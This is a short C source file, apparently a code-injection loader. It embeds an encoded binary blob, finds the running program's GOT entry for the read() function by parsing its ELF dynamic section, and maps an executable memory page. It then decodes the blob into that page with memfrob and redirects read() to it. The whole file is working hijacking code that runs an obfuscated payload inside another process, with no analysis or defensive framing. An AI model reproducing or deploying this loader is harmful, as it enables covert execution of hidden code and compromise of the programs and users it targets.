#define _GNU_SOURCE
#include <stdint.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/auxv.h>
#include <sys/mman.h>
#include <stdio.h>
#include <libelf.h>

__asm__(
"embedded:"
".incbin \"library/injected.enc\"\n"
"embedded_end:"
);

extern char embedded[];
extern char embedded_end[];

#define embedded_size embedded_end - embedded

static void* find_got_entry(const void *elf_addr, const char *func_name) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf_addr;
    Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)elf_addr + ehdr->e_phoff);

    Elf64_Sym* symtab = NULL;
    Elf64_Rela* rela_plt = NULL;
    const char* strtab = NULL;

    // locate symtab, jmprels and strtab
    for (int i = 0; i < ehdr->e_phnum; ++i) {
        if (phdr[i].p_type == PT_DYNAMIC) {
            Elf64_Dyn *dyn = (Elf64_Dyn *)((char *)elf_addr + phdr[i].p_offset);
            while (dyn->d_tag != DT_NULL) {
                if (dyn->d_tag == DT_SYMTAB) {
                    symtab = (Elf64_Sym *)((char *)elf_addr + dyn->d_un.d_ptr);
                } else if (dyn->d_tag == DT_STRTAB) {
                    strtab = (char *)elf_addr + dyn->d_un.d_ptr;
                } else if (dyn->d_tag == DT_JMPREL) {
                    rela_plt = (Elf64_Rela *)((char *)elf_addr + dyn->d_un.d_ptr);
                }
                dyn++;
            }
        }
    }
    if (!symtab || !strtab || !rela_plt) {
        return NULL;
    }

    // find symbol number of desired function
    int sym_idx = -1;
    for (int i = 0; (char*)(symtab + i) < strtab; i++) {
        Elf64_Sym* sym = symtab + i;
        if (!sym->st_name) continue;
        const char* symname = &strtab[sym->st_name];
        if (strcmp(symname, func_name) == 0) {
            sym_idx = i;
            break;
        }
    }
    if (sym_idx < 0) {
        return NULL;
    }

    // find relocation for that symbol
    while (rela_plt->r_offset) {
        if (ELF64_R_SYM(rela_plt->r_info) == sym_idx) {
            return (char *)elf_addr + rela_plt->r_offset;
        }
        rela_plt++;
    }

    return NULL;
}



void activate() {
    unsigned long phdrs = getauxval(AT_PHDR);
    void* program_loc = (void*)(phdrs & ~0xfff);
    void** addr = find_got_entry(program_loc, "read");

    void* page = mmap(NULL, (embedded_size & ~0xfff) + 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
    memcpy(page, embedded, embedded_size);
    memfrob(page, embedded_size);
    *addr = page;
}
